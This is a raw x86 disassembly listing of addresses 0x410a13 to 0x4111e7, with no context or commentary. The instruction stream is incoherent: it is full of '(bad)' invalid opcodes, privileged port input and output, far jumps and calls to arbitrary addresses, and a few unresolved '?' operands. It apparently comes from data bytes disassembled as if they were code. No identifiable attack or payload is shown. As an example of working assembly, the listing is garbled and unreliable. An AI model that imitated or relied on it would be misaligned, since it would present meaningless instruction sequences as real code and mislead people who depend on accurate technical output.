  410a13:	shr    DWORD PTR [edx+0x76],1
  410a16:	int3   
  410a17:	enter  0xe7b6,0x92
  410a1b:	or     BYTE PTR [ecx-0xe89610f],dh
  410a21:	call   0x9f1f6ad7
  410a26:	pop    ebx
  410a27:	mov    edx,0x58fe0f92
  410a2c:	in     al,0x99
  410a2e:	enter  0x44f7,0x93
  410a32:	pop    ecx
  410a33:	call   0xcef:0x2fec6090
  410a3a:	sar    bl,0x3d
  410a3d:	jnp    0x4109fd
  410a3f:	mov    ds:0xd03bebf3,al
  410a44:	mov    fs,WORD PTR [ecx+edx*4+0x601e68b9]
  410a4b:	test   BYTE PTR [edx+0x3db4ea95],dl
  410a51:	mov    cl,0x16
  410a53:	data16 ficom DWORD PTR [edi+0x34cf2c59]
  410a5a:	jo     0x410a95
  410a5c:	pushf  
  410a5d:	pop    edi
  410a5e:	sub    al,BYTE PTR [esi-0x5407d6e0]
  410a64:	cdq    
  410a65:	ja     0x410a0c
  410a67:	ins    BYTE PTR es:[edi],dx
  410a68:	sub    DWORD PTR [edx+0x2c366a5b],edx
  410a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a6f:	prefetchnta BYTE PTR [ecx-0x5f397bec]
  410a76:	mov    ebx,0xe3773a57
  410a7b:	(bad)  
  410a7c:	out    0x95,eax
  410a7e:	pop    edi
  410a7f:	xchg   ebx,eax
  410a80:	jecxz  0x410a6d
  410a82:	sub    al,BYTE PTR ds:0x85c0fec0
  410a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a89:	sbb    eax,0x199fa5ec
  410a8e:	nop
  410a8f:	lock aas 
  410a91:	fld    QWORD PTR [edx]
  410a93:	lahf   
  410a94:	scas   al,BYTE PTR es:[edi]
  410a95:	mov    ah,0xae
  410a97:	sub    bl,BYTE PTR [ebx+0x3c7fa4e0]
  410a9d:	shr    ebx,cl
  410a9f:	mov    eax,0xbb2254ae
  410aa4:	adc    DWORD PTR ds:0x93e025e,edx
  410aaa:	jae    0x410ac4
  410aac:	mov    eax,0x2cefd0ad
  410ab1:	lods   al,BYTE PTR ds:[esi]
  410ab3:	test   BYTE PTR [ebp+0x35],cl
  410ab6:	(bad)  
  410ab7:	aas    
  410ab8:	cmp    BYTE PTR [edi-0x33691ab2],bh
  410abe:	push   cs
  410abf:	inc    esi
  410ac0:	jmp    0xde03c80e
  410ac5:	iret   
  410ac6:	pop    ebx
  410ac7:	aam    0x6a
  410ac9:	mov    edx,0xa90385c1
  410ace:	pop    ecx
  410acf:	pop    ebx
  410ad0:	ds push ebx
  410ad2:	xchg   edx,eax
  410ad3:	add    eax,0xbf2ecbc0
  410ad8:	pop    edx
  410ad9:	fidiv  DWORD PTR [esi]
  410adb:	push   cs
  410adc:	(bad)  
  410add:	ds sub eax,0x7d30fcc1
  410ae3:	test   BYTE PTR [ebp-0x21],al
  410ae6:	adc    eax,ebp
  410ae8:	ror    BYTE PTR [esi],1
  410aea:	mov    ebx,0x6dfb39ad
  410aef:	cmp    BYTE PTR [eax],0x82
  410af2:	(bad)  
  410af3:	aad    0x35
  410af5:	dec    edx
  410af6:	mov    ch,0xc4
  410af8:	rcl    DWORD PTR [eax-0xddf0a3c],1
  410afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aff:	(bad)  
  410b00:	aas    
  410b01:	out    dx,al
  410b02:	ret    
  410b03:	pushf  
  410b04:	(bad)
  410b08:	cdq    
  410b09:	mov    BYTE PTR [eax+0x30],bl
  410b0c:	xchg   DWORD PTR [edi+eiz*1],edx
  410b0f:	cmp    cl,BYTE PTR [ecx-0x113a229d]
  410b15:	imul   edi,DWORD PTR ds:0x4de9f284,0x8ddf30da
  410b1f:	mov    ecx,?
  410b21:	sub    eax,0xb5695416
  410b26:	sbb    edx,DWORD PTR ds:0x4c40aa4b
  410b2c:	push   ebp
  410b2d:	out    0xd4,eax
  410b2f:	fs int3 
  410b31:	xchg   ebp,eax
  410b32:	in     al,0xbf
  410b34:	(bad)  [ecx+0x29545771]
  410b3a:	pop    ebx
  410b3b:	inc    esp
  410b3c:	jb     0x410b48
  410b3e:	xchg   DWORD PTR [ebp-0x7b1367ea],edi
  410b44:	nop
  410b45:	and    bl,BYTE PTR [esi+0x72]
  410b48:	sahf   
  410b49:	pop    es
  410b4a:	jbe    0x410aec
  410b4c:	ss daa 
  410b4e:	popa   
  410b4f:	mov    ds:0xeb649bcb,eax
  410b54:	xlat   BYTE PTR ds:[ebx]
  410b55:	push   0xffffffda
  410b57:	stc    
  410b58:	cmp    dl,BYTE PTR [ebx+0x4aa482c8]
  410b5e:	scas   al,BYTE PTR es:[edi]
  410b5f:	addr16 and eax,0x9c016a5a
  410b65:	rcr    BYTE PTR [edx+0x5a],0xed
  410b69:	jle    0x410b43
  410b6b:	xchg   ebx,eax
  410b6c:	data16 je 0x410b15
  410b6f:	lock in eax,0xb7
  410b72:	pop    ebx
  410b73:	fsubr  DWORD PTR [edx+0x33ab8ca7]
  410b79:	in     al,0x5a
  410b7b:	jp     0x410b94
  410b7d:	pusha  
  410b7e:	rol    BYTE PTR [eax-0x28],0x6a
  410b82:	scas   eax,DWORD PTR es:[edi]
  410b83:	test   BYTE PTR [edi],ah
  410b85:	outs   dx,DWORD PTR ds:[esi]
  410b86:	xchg   edx,eax
  410b87:	in     al,dx
  410b88:	and    eax,DWORD PTR [ebx-0x2b]
  410b8b:	and    al,0x5a
  410b8d:	mov    ecx,0xaf56c629
  410b92:	push   eax
  410b93:	inc    esp
  410b94:	outs   dx,BYTE PTR ds:[esi]
  410b95:	out    0x96,al
  410b97:	push   eax
  410b98:	loop   0x410bf6
  410b9a:	push   ss
  410b9b:	stos   DWORD PTR es:[edi],eax
  410b9c:	ins    BYTE PTR es:[edi],dx
  410b9d:	mov    DWORD PTR [edx],ebx
  410b9f:	mov    edi,0xca5b9a5b
  410ba4:	xor    al,0x6b
  410ba6:	adc    BYTE PTR [edi-0x7bb4f50a],0x61
  410bad:	loopne 0x410bb6
  410baf:	lahf   
  410bb0:	ds cdq 
  410bb2:	xchg   ecx,eax
  410bb3:	pusha  
  410bb4:	mov    ch,BYTE PTR [esi-0x18030ae7]
  410bba:	cmp    BYTE PTR [edi+0x740f7b43],cl
  410bc0:	pop    edx
  410bc1:	ret    0x314b
  410bc4:	mov    edx,0x4e505fd0
  410bc9:	daa    
  410bca:	retf   0xd605
  410bcd:	cli    
  410bce:	je     0x410c48
  410bd0:	fs jo  0x410bd6
  410bd3:	xchg   BYTE PTR [ebp-0x51],bl
  410bd6:	pop    ebx
  410bd7:	test   BYTE PTR [esi],bh
  410bd9:	in     eax,dx
  410bda:	pop    ds
  410bdb:	jno    0x410b67
  410bdd:	cli    
  410bde:	dec    ebp
  410bdf:	mov    al,ds:0x9bf4d917
  410be4:	xchg   ebp,eax
  410be5:	gs loope 0x410bc6
  410be8:	add    eax,0x9dc2408b
  410bed:	mov    bl,0x94
  410bef:	and    eax,0x285a7aba
  410bf4:	dec    ebx
  410bf5:	repz addr16 add eax,0x85ef710e
  410bfc:	and    BYTE PTR [ebx+edx*2],bh
  410bff:	push   ds
  410c00:	aas    
  410c01:	mov    eax,ds:0xb57dc7a
  410c06:	call   0x1996:0x98e77547
  410c0d:	mov    WORD PTR [ebx+eiz*2],?
  410c10:	stos   DWORD PTR es:[edi],eax
  410c11:	xchg   ebp,eax
  410c12:	or     ecx,DWORD PTR [esi-0x2f]
  410c15:	push   ss
  410c16:	pop    ebx
  410c17:	js     0x410bf0
  410c19:	xor    al,BYTE PTR [ebx-0x2b4dc581]
  410c1f:	test   DWORD PTR [ecx+esi*8],ebp
  410c22:	inc    eax
  410c23:	push   cs
  410c24:	repz rol dh,1
  410c27:	data16 xor ah,dl
  410c2a:	pop    edx
  410c2b:	push   esi
  410c2c:	inc    ebx
  410c2d:	int    0x1f
  410c2f:	pusha  
  410c30:	enter  0x91ef,0x85
  410c34:	pop    es
  410c35:	lds    edi,FWORD PTR [edx]
  410c37:	add    BYTE PTR [edi],bh
  410c39:	or     ebp,eax
  410c3b:	out    dx,al
  410c3c:	(bad)  
  410c3d:	xor    DWORD PTR ds:0x94ee28cc,edx
  410c43:	aas    
  410c44:	inc    edx
  410c45:	adc    dl,BYTE PTR [esp+esi*1+0x5db8fb1]
  410c4c:	cmp    DWORD PTR [ecx-0x422242bf],ebx
  410c52:	ja     0x410bdf
  410c54:	cmp    eax,0x86db7d7d
  410c59:	and    al,0x9e
  410c5b:	push   ss
  410c5c:	enter  0xe66b,0xa3
  410c60:	cld    
  410c61:	cld    
  410c62:	push   edx
  410c63:	test   BYTE PTR [eax+edx*8-0x6a6685cd],al
  410c6a:	push   esp
  410c6b:	inc    esi
  410c6c:	pop    edi
  410c6d:	inc    edi
  410c6e:	push   edi
  410c6f:	arpl   WORD PTR [esi+ebx*1],di
  410c72:	outs   dx,DWORD PTR ds:[esi]
  410c73:	stos   BYTE PTR es:[edi],al
  410c74:	push   ds
  410c75:	adc    BYTE PTR [edi],0x84
  410c78:	inc    ebp
  410c79:	mov    BYTE PTR [edi+0x4a093e64],al
  410c7f:	adc    al,0xaf
  410c81:	scas   al,BYTE PTR es:[edi]
  410c82:	mov    al,ds:0x24e65ab8
  410c87:	scas   al,BYTE PTR es:[edi]
  410c88:	jbe    0x410c74
  410c8a:	out    0x1f,al
  410c8c:	test   eax,0x3f3176b7
  410c91:	sti    
  410c92:	xchg   DWORD PTR [ebx-0x13],ecx
  410c95:	inc    ebx
  410c96:	fstp   DWORD PTR [edx-0x5aa4f9d8]
  410c9c:	je     0x410c5e
  410c9e:	sbb    BYTE PTR [esp+eiz*8-0x40ea3ff1],al
  410ca5:	mov    dl,0xf8
  410ca7:	call   0xba8d922
  410cac:	xor    esp,eax
  410cae:	jmp    0x6fc8:0x1cf29e41
  410cb5:	cs test esp,ebp
  410cb8:	xor    DWORD PTR [edi+0x230ccfaf],esp
  410cbe:	out    dx,eax
  410cbf:	xor    ch,BYTE PTR [ecx+0x73]
  410cc2:	sbb    bl,dh
  410cc4:	or     dl,BYTE PTR [ecx-0x1f]
  410cc7:	test   DWORD PTR [edi+0x418d2e36],eax
  410ccd:	lods   eax,DWORD PTR ds:[esi]
  410cce:	(bad)  
  410ccf:	retf   0x1038
  410cd2:	mov    al,ds:0x5b241cf7
  410cd7:	sbb    al,0x14
  410cd9:	add    esi,DWORD PTR [ecx+0x5b]
  410cdc:	fs xor esi,edx
  410cdf:	test   DWORD PTR [ecx],ecx
  410ce1:	fimul  DWORD PTR [esi-0x16]
  410ce4:	ds jno 0x410c6b
  410ce7:	and    eax,DWORD PTR [eax+0x6d]
  410cea:	sti    
  410ceb:	mov    ch,cl
  410ced:	out    0x6a,al
  410cef:	xchg   edi,eax
  410cf0:	lock es daa 
  410cf3:	test   al,0xd1
  410cf5:	das    
  410cf6:	in     al,dx
  410cf7:	inc    DWORD PTR [ebx-0x5573a049]
  410cfd:	dec    ebp
  410cfe:	adc    al,0xb9
  410d00:	out    dx,al
  410d01:	sbb    eax,0x2f5eb0da
  410d06:	pop    ebp
  410d07:	test   al,0xe8
  410d09:	xchg   DWORD PTR [ecx-0x25],esi
  410d0c:	xor    al,0xf8
  410d0e:	je     0x410d1e
  410d10:	sbb    BYTE PTR [edx-0xc],ch
  410d13:	add    edx,DWORD PTR [edi+0x3fb79a8d]
  410d19:	mov    edi,0xded1969f
  410d1e:	push   ss
  410d1f:	or     esp,edi
  410d21:	in     al,0xc2
  410d23:	shl    DWORD PTR [ebx+edx*8-0x43],0x59
  410d28:	pop    ebp
  410d29:	jle    0x410cfa
  410d2b:	fdiv   DWORD PTR [esi]
  410d2d:	cmc    
  410d2e:	xchg   edi,eax
  410d2f:	dec    edx
  410d30:	ds (bad) 
  410d32:	aad    0x9e
  410d34:	lahf   
  410d35:	loop   0x410d0c
  410d37:	pop    ss
  410d38:	push   ss
  410d39:	out    0xa6,eax
  410d3b:	test   bl,0xe
  410d3e:	pop    ds
  410d3f:	fistp  DWORD PTR [esi+0x18]
  410d42:	push   edx
  410d43:	arpl   WORD PTR [ebp+eax*2+0x5a],di
  410d47:	xchg   esi,eax
  410d48:	cmc    
  410d49:	sbb    al,0x29
  410d4b:	inc    ecx
  410d4c:	mov    gs,WORD PTR [edx+0x54]
  410d4f:	test   DWORD PTR [edx],esp
  410d51:	in     eax,0xc0
  410d53:	out    dx,eax
  410d54:	aas    
  410d55:	fwait
  410d56:	push   edi
  410d57:	mov    edx,0xea95d2d3
  410d5c:	in     al,dx
  410d5d:	out    0x9c,eax
  410d5f:	in     eax,0x25
  410d61:	iret   
  410d62:	sbb    eax,0xe2e35126
  410d67:	mov    al,ds:0x5c59ca08
  410d6c:	pop    eax
  410d6d:	push   0xe702f20d
  410d72:	loop   0x410d15
  410d74:	jno    0x410de3
  410d76:	enter  0xc50d,0xf3
  410d7a:	adc    eax,0x44326be9
  410d7f:	jo     0x410da4
  410d81:	mov    BYTE PTR [ebx+edi*4+0x7],dh
  410d85:	mov    bh,0xc
  410d87:	add    eax,0x736ee0c0
  410d8c:	ins    BYTE PTR es:[edi],dx
  410d8d:	push   edi
  410d8f:	mov    al,ds:0xcd470670
  410d94:	cwde   
  410d95:	pop    edx
  410d96:	test   edi,ecx
  410d98:	xor    DWORD PTR [ecx+0x5b],0xa7bf8282
  410d9f:	dec    edi
  410da0:	push   esi
  410da1:	fld    st(2)
  410da3:	test   BYTE PTR [ebx-0x12],dl
  410da6:	into   
  410da7:	cmp    DWORD PTR [esi],0xad9b050f
  410dad:	fsubr  DWORD PTR [ebx-0x5b]
  410db0:	mov    esp,edi
  410db2:	idiv   BYTE PTR [esi+0x6242c5ae]
  410db8:	dec    ecx
  410db9:	adc    eax,0xcf47880f
  410dbe:	mov    edi,0xed36690e
  410dc3:	test   DWORD PTR ds:0xb0971529,ecx
  410dc9:	pop    eax
  410dca:	xchg   ecx,eax
  410dcb:	test   BYTE PTR [esp+edi*1-0x7e],dh
  410dcf:	or     al,0x3f
  410dd1:	mov    esp,DWORD PTR [edi+eiz*2-0x61]
  410dd5:	test   eax,0xe71631bd
  410dda:	cmp    dh,dl
  410ddc:	int    0x32
  410dde:	dec    ebp
  410ddf:	fisub  WORD PTR [edx]
  410de1:	push   0xdbad5310
  410de6:	pop    ebx
  410de7:	scas   al,BYTE PTR es:[edi]
  410de8:	(bad)  
  410de9:	aas    
  410dea:	xchg   ecx,eax
  410deb:	mov    esi,0x85d6128a
  410df0:	sub    DWORD PTR [esi-0x51],edi
  410df3:	repz ds dec ecx
  410df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410df7:	(bad)  
  410df8:	mov    eax,ds:0xb72d2937
  410dfd:	sbb    edi,edx
  410dff:	xor    eax,0x8648b1a6
  410e04:	imul   ebp,DWORD PTR [esi],0x38774504
  410e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e0b:	push   cs
  410e0c:	shl    DWORD PTR [ebx+ebx*2-0x62],0x65
  410e11:	hlt    
  410e12:	or     bh,BYTE PTR [ecx-0x4db5168f]
  410e18:	pop    ebx
  410e19:	cmp    bl,BYTE PTR [ebx+0x6e]
  410e1c:	aas    
  410e1d:	inc    ebp
  410e1e:	jecxz  0x410e7b
  410e20:	retf   0x138e
  410e23:	inc    edi
  410e24:	mov    ebx,0xffb1c8e7
  410e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e2a:	add    BYTE PTR [edi-0x60338168],bl
  410e30:	cwde   
  410e31:	iret   
  410e32:	pop    eax
  410e33:	sub    dh,BYTE PTR ds:0x1e10ea87
  410e39:	jecxz  0x410ded
  410e3b:	cmp    DWORD PTR [eax+0x15],edx
  410e3e:	mov    ah,dl
  410e40:	(bad)  
  410e41:	aas    
  410e42:	and    eax,0x77c73f1a
  410e47:	cwde   
  410e48:	or     eax,0x382efeae
  410e4d:	fdivp  st(2),st
  410e4f:	jnp    0x410e26
  410e51:	lahf   
  410e52:	jns    0x410e8d
  410e54:	xlat   BYTE PTR ds:[ebx]
  410e55:	sbb    DWORD PTR [ebx-0x1b],0xffffffdc
  410e59:	fwait
  410e5a:	jo     0x410e4f
  410e5c:	or     bh,ah
  410e5e:	and    eax,0xe2311896
  410e63:	dec    edx
  410e64:	and    dh,ah
  410e66:	les    ecx,FWORD PTR [eax]
  410e68:	iret   
  410e69:	pop    edx
  410e6a:	aad    0xc
  410e6c:	les    edi,FWORD PTR [ecx+ebx*1-0x66]
  410e70:	neg    DWORD PTR [bp+di-0x74]
  410e74:	push   0x16da8bd7
  410e79:	stos   BYTE PTR es:[edi],al
  410e7a:	or     DWORD PTR [ebp+eiz*2+0x7260aafa],eax
  410e81:	das    
  410e82:	add    ebp,DWORD PTR [edi-0x3543a2c2]
  410e88:	push   ebx
  410e89:	adc    BYTE PTR [eax+0x52],0xce
  410e8d:	fs add eax,0xb0fc2482
  410e93:	xchg   esi,eax
  410e94:	mov    ds,esi
  410e96:	mov    esp,DWORD PTR [edi+0x29]
  410e99:	out    0x2b,eax
  410e9b:	push   esi
  410e9c:	mov    eax,gs
  410e9e:	push   edi
  410e9f:	push   es
  410ea0:	xchg   edx,esp
  410ea2:	inc    esi
  410ea3:	push   eax
  410ea4:	jmp    0x2d27:0x8e917011
  410eab:	or     DWORD PTR [ecx+esi*1+0x5b],0xe03d037a
  410eb3:	lods   al,BYTE PTR ds:[esi]
  410eb4:	and    al,0x17
  410eb6:	iret   
  410eb7:	sbb    al,0xd6
  410eb9:	ss pop edx
  410ebb:	sbb    ah,BYTE PTR [edx-0x48]
  410ebe:	jno    0x410e49
  410ec0:	sub    edi,DWORD PTR [edx+0x5b]
  410ec3:	inc    eax
  410ec4:	retf   
  410ec5:	dec    eax
  410ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ec7:	and    esi,DWORD PTR [esi+0x2]
  410eca:	mov    esp,0x65dafc85
  410ecf:	mov    bh,BYTE PTR [edi]
  410ed1:	adc    eax,0x43e6a34
  410ed6:	mov    eax,0x82e6f049
  410edb:	or     esi,DWORD PTR [ecx+0x3d5a4e8a]
  410ee1:	mov    cl,0xd9
  410ee3:	xor    DWORD PTR [edi+ecx*8+0x55],edi
  410ee7:	loop   0x410e87
  410ee9:	aaa    
  410eea:	or     eax,0x9c10f0e0
  410eef:	lock mov BYTE PTR [edi-0x7b],0x85
  410ef4:	fdiv   QWORD PTR [ebx-0x4ec03f12]
  410efa:	daa    
  410efb:	std    
  410efc:	fistp  QWORD PTR [eax-0x47]
  410eff:	adc    esp,DWORD PTR [ebp+0x5db17166]
  410f05:	mov    edi,0x933df526
  410f0a:	pop    ebp
  410f0b:	push   0xfa555947
  410f10:	(bad)  
  410f12:	mov    bh,BYTE PTR [edi-0x1e]
  410f15:	daa    
  410f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f17:	mov    WORD PTR [ecx+ebx*4],?
  410f1a:	mov    ch,0x55
  410f1c:	xor    eax,0xf627db30
  410f21:	shl    DWORD PTR [eax],0x85
  410f24:	scas   eax,DWORD PTR es:[edi]
  410f25:	pop    ecx
  410f26:	add    DWORD PTR [eax+0x3e],ebp
  410f29:	jge    0x410f06
  410f2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f2c:	rcl    DWORD PTR [esi+eiz*2],0x46
  410f30:	mov    esi,fs
  410f32:	out    0x12,al
  410f34:	(bad)  
  410f35:	lock xchg esp,eax
  410f37:	inc    edx
  410f38:	popa   
  410f39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f3a:	xor    DWORD PTR [ebp+0x1a],eax
  410f3d:	mov    WORD PTR [edx+eiz*2+0x7e],ss
  410f41:	sbb    ch,ah
  410f43:	dec    ecx
  410f44:	xchg   esi,eax
  410f45:	out    0xd8,al
  410f47:	cmc    
  410f48:	loope  0x410f07
  410f4a:	dec    edx
  410f4b:	xor    ch,bl
  410f4d:	jns    0x410eed
  410f4f:	add    al,0xa7
  410f51:	mov    bl,BYTE PTR [edx-0x78]
  410f54:	mov    bl,0x40
  410f56:	mov    BYTE PTR [esp+eax*1-0x12795f03],bh
  410f5d:	cmp    al,0x53
  410f5f:	dec    esp
  410f60:	push   ecx
  410f61:	adc    BYTE PTR [ecx+0x5b8afe65],ch
  410f67:	stos   BYTE PTR es:[edi],al
  410f68:	push   ss
  410f69:	sbb    al,0x43
  410f6b:	aam    0xc8
  410f6d:	das    
  410f6e:	xor    DWORD PTR [esi+ebp*8+0x3f83fecb],eax
  410f75:	lods   eax,DWORD PTR ds:[esi]
  410f76:	fstp   TBYTE PTR [eax+0x6b]
  410f79:	xchg   edi,eax
  410f7b:	test   dh,0xfb
  410f7e:	xor    al,0xf4
  410f80:	shl    DWORD PTR [ecx+0x433cd512],1
  410f86:	pop    ebx
  410f87:	stos   DWORD PTR es:[edi],eax
  410f88:	aas    
  410f89:	lods   eax,DWORD PTR ds:[esi]
  410f8a:	cwde   
  410f8b:	jb     0x410fdf
  410f8d:	retf   
  410f8e:	adc    DWORD PTR ds:0xb964e72a,esp
  410f94:	test   eax,0xfcda6416
  410f99:	jge    0x410f90
  410f9b:	pop    eax
  410f9c:	xor    BYTE PTR [ecx-0x41],bl
  410f9f:	(bad)  
  410fa0:	rcr    BYTE PTR [edi+0x2e],1
  410fa3:	fiadd  DWORD PTR [esi+0x78]
  410fa6:	mov    edx,0xe5c5e68e
  410fab:	test   BYTE PTR [esi],bl
  410fad:	lahf   
  410fae:	idiv   BYTE PTR [ebx+0x6412d738]
  410fb4:	lea    esi,[ebx*1-0xa59a480]
  410fbb:	inc    esp
  410fbc:	sbb    BYTE PTR [edx-0x12],bl
  410fbf:	test   DWORD PTR [ebx+0x56],esi
  410fc2:	fld    st(3)
  410fc4:	ds jecxz 0x411013
  410fc7:	mov    cl,0xcd
  410fc9:	mov    esp,0xe699b1e1
  410fce:	or     ah,ah
  410fd0:	imul   esp,DWORD PTR [ecx],0xffffffb8
  410fd3:	imul   edi,ebp,0x6c8c4df7
  410fd9:	xor    bl,BYTE PTR [ebx-0x24]
  410fdc:	or     al,BYTE PTR [ebp+0xe9e6845]
  410fe2:	ins    BYTE PTR es:[edi],dx
  410fe3:	int    0x16
  410fe5:	pop    ds
  410fe6:	in     al,dx
  410fe7:	test   eax,ebx
  410fe9:	or     edx,esi
  410feb:	add    al,0x89
  410fed:	push   eax
  410fee:	pop    edx
  410fef:	lock ret 0xd584
  410ff3:	xchg   BYTE PTR [eax],bl
  410ff5:	out    0xf6,al
  410ff7:	jl     0x410ffc
  410ff9:	cli    
  410ffa:	jg     0x410f8c
  410ffc:	jb     0x411037
  410ffe:	push   ebp
  410fff:	imul   edi,DWORD PTR [edi],0x2b
  411002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411003:	daa    
  411004:	(bad)  
  411005:	jge    0x411026
  411007:	in     eax,dx
  411008:	dec    ebp
  411009:	out    0x9a,al
  41100b:	imul   esp,DWORD PTR [eax-0x3a],0xa5146321
  411012:	mov    al,ds:0x44e8d8ee
  411017:	nop
  411018:	out    0x8a,eax
  41101a:	mov    esi,0x62c1dd84
  41101f:	mov    BYTE PTR [eax-0x61],bh
  411022:	push   ebp
  411023:	shl    DWORD PTR [esi-0x4502ce19],cl
  411029:	xor    BYTE PTR [esi+0x61],bh
  41102c:	(bad)  
  41102d:	out    0xea,al
  41102f:	repnz (bad) 
  411031:	into   
  411032:	shl    ecx,cl
  411034:	mov    ebp,0xe85e3708
  411039:	outs   dx,BYTE PTR ds:[esi]
  41103a:	pop    edx
  41103b:	xor    ah,BYTE PTR [ebx]
  41103d:	jae    0x411037
  41103f:	xlat   BYTE PTR ds:[ebx]
  411040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411041:	and    dh,BYTE PTR [edi]
  411043:	test   DWORD PTR [esi+0xa],ecx
  411046:	(bad)  
  411047:	(bad)  
  411049:	mov    cl,0x66
  41104b:	dec    edx
  41104c:	div    al
  41104e:	pop    ebx
  41104f:	and    al,0x4a
  411051:	dec    edi
  411052:	cmp    BYTE PTR [esp+ecx*8],dl
  411055:	in     al,0xe8
  411057:	jbe    0x4110af
  411059:	pop    ds
  41105a:	cld    
  41105b:	sub    BYTE PTR [edi+0x13],ah
  41105e:	enter  0xa820,0xb1
  411062:	pop    ebx
  411063:	xor    DWORD PTR [esi-0x48],esi
  411066:	aam    0x85
  411068:	sar    cl,1
  41106a:	add    al,0xf
  41106c:	ds or  eax,0x5a231dab
  411072:	jmp    0x4110c7
  411074:	js     0x41105d
  411076:	mov    eax,0x8d65acb1
  41107b:	out    0x4,al
  41107d:	aad    0x6b
  41107f:	mov    bl,0x26
  411081:	out    0x25,eax
  411083:	idiv   BYTE PTR [esi+0x31]
  411086:	fist   WORD PTR [ebp-0x26]
  411089:	out    0x48,al
  41108b:	sti    
  41108c:	jns    0x41107b
  41108e:	in     eax,dx
  41108f:	add    al,0x2f
  411091:	cmp    eax,ebx
  411093:	call   0xc49ba0e7
  411098:	(bad)  [ebx]
  41109a:	pop    esp
  41109b:	sar    DWORD PTR [esi-0x77],1
  41109e:	xor    eax,DWORD PTR [edi+eax*8+0x3ef92205]
  4110a5:	mov    ch,0x11
  4110a7:	adc    bh,BYTE PTR [ecx-0x2e65c143]
  4110ad:	out    0x96,al
  4110af:	cli    
  4110b0:	sbb    BYTE PTR [ecx+0x2212f806],0xd4
  4110b7:	(bad)  
  4110b8:	aad    0x18
  4110ba:	pop    ebx
  4110bb:	(bad)  
  4110bc:	cdq    
  4110bd:	ja     0x41110a
  4110bf:	dec    ebx
  4110c0:	xchg   esp,eax
  4110c1:	add    DWORD PTR [esi],edi
  4110c3:	test   BYTE PTR ds:0x3152c35d,cl
  4110c9:	pop    edi
  4110ca:	inc    ebp
  4110cb:	icebp  
  4110cc:	cmp    eax,0x8ffd60ef
  4110d1:	(bad)  
  4110d2:	cli    
  4110d3:	cdq    
  4110d4:	jbe    0x4110a4
  4110d6:	xor    BYTE PTR [eax+ecx*4-0x8c89853],al
  4110dd:	scas   al,BYTE PTR es:[edi]
  4110de:	dec    esi
  4110df:	or     ecx,DWORD PTR [eiz*4+0x628b825a]
  4110e6:	and    ch,BYTE PTR [edi]
  4110e8:	dec    BYTE PTR ds:0x53d84c8
  4110ee:	pop    eax
  4110ef:	mov    ecx,0xc4daafd5
  4110f4:	mov    al,ds:0x25505a54
  4110f9:	aad    0x39
  4110fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110fc:	add    BYTE PTR [edi],ah
  4110fe:	push   es
  4110ff:	test   DWORD PTR [edi+0x3eadfff1],edx
  411105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411106:	adc    al,0x64
  411108:	clc    
  411109:	rcl    DWORD PTR [ecx+0x72e72d1d],0xda
  411110:	ror    ebp,0x1d
  411113:	push   0x583850b3
  411118:	popw   es
  41111a:	push   esp
  41111b:	sar    bh,cl
  41111d:	and    al,dh
  41111f:	dec    ecx
  411120:	push   ds
  411121:	cmp    al,BYTE PTR [edi-0x22]
  411124:	and    esi,esp
  411126:	pop    edx
  411127:	push   ecx
  411128:	loopne 0x41115f
  41112a:	push   ebx
  41112b:	push   ss
  41112c:	adc    ch,BYTE PTR [esi-0x44efa784]
  411132:	pop    ebx
  411133:	add    al,0xc4
  411135:	lock std 
  411137:	out    dx,eax
  411138:	clc    
  411139:	lock push ss
  41113b:	test   BYTE PTR [esi],al
  41113d:	test   eax,0xafc5f82b
  411142:	push   0x69
  411144:	mov    ecx,0xcfa6218
  411149:	mov    edi,0x9ce28525
  41114e:	out    0xa7,al
  411150:	pushf  
  411151:	push   esi
  411152:	pop    DWORD PTR [esi+eax*4+0x3e0deff5]
  411159:	mov    ds:0xbe0ed5c2,eax
  41115e:	dec    esp
  41115f:	pushf  
  411160:	(bad)  
  411162:	js     0x4111dd
  411164:	ror    ah,cl
  411166:	xchg   ebx,eax
  411167:	call   0xe5ed:0x3141bc76
  41116e:	and    eax,0x67b9e1a4
  411173:	push   esp
  411174:	jle    0x41118f
  411176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411177:	popa   
  411178:	out    0x56,al
  41117a:	ret    0x285
  41117d:	pusha  
  41117e:	scas   al,BYTE PTR es:[edi]
  41117f:	sub    edi,DWORD PTR [esi]
  411181:	jnp    0x411174
  411183:	or     al,bl
  411185:	cwde   
  411186:	clc    
  411187:	jge    0x41115d
  411189:	out    0xe2,al
  41118b:	cmc    
  41118c:	cs es (bad) 
  41118f:	ror    DWORD PTR ds:0x6b3aea39,0x73
  411196:	pop    edx
  411197:	jle    0x411172
  411199:	push   0xb10a4163
  41119e:	push   eax
  41119f:	test   BYTE PTR [esp+eiz*8-0x80],ah
  4111a3:	sbb    eax,0x72f7553f
  4111a8:	test   eax,0xd7fd8c17
  4111ad:	shr    dl,0xfa
  4111b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111b1:	lock adc BYTE PTR [esi+edi*1+0x44332d54],ch
  4111b9:	cdq    
  4111ba:	add    ax,0x6614
  4111be:	pop    ebx
  4111bf:	bnd jl 0x4111c7
  4111c2:	push   ebp
  4111c3:	ds ins BYTE PTR es:[edi],dx
  4111c5:	dec    esi
  4111c6:	icebp  
  4111c7:	mov    esp,0x4ebd449
  4111cc:	fnstcw WORD PTR [ecx+ecx*2+0x2ce687ac]
  4111d3:	pop    edx
  4111d4:	out    0x84,al
  4111d6:	mov    edx,0x28e608a2
  4111db:	lea    eax,[ebx+0x30]
  4111de:	ret    
  4111df:	sbb    al,0x84
  4111e1:	mov    esp,0xb2e034c
  4111e6:	pop    edx
  4111e7:	cli    
